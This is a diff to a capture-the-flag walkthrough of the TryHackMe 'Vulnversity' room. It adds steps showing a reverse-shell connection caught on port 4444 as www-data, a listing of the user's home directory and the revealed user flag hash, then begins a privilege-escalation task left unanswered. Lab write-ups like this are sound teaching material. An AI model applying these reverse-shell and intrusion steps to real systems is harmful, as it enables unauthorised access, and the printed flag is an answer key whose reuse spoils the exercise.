@@ -191,8 +191,58 @@ $ip = 'vulnversity.thm';
 $port = 4444;  
 ```
 
-#### 3.2 -&#x20;
+#### 4.2 - What is the name of the user who manages the webserver?
 
-#### 3.2 -&#x20;
+```bash
+listening on [any] 4444 ...
+connect to [10.9.80.228] from (UNKNOWN) [10.10.114.236] 39004
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 14:05:44 up 46 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+```
 
+```bash
+$ ls home
+bill
+```
+
+#### 4.3 - What is the user flag?
+
+```bash
+cd home/bill
+ls -ah
+.
+..
+.bash_logout
+.bashrc
+.profile
+user.txt
+```
+
+```bash
+cat user.txt
+```
+
+<details>
+
+<summary>🚩Reveal Flag1 [user.txt]</summary>
+
+8bd7992fbe8a6ad22a63361004cfcedb
+
+</details>
+
+### Task 5 - Privilege Escalation
+
+Now that you have compromised this machine, we will escalate our privileges and become the superuser (root).
+
+#### 5.1 - On the system, search for all SUID files. Which file stands out?
+
+
+
+#### 5.2 - Become root and get the last flag (/root/root.txt)
+
+\
+\
 \
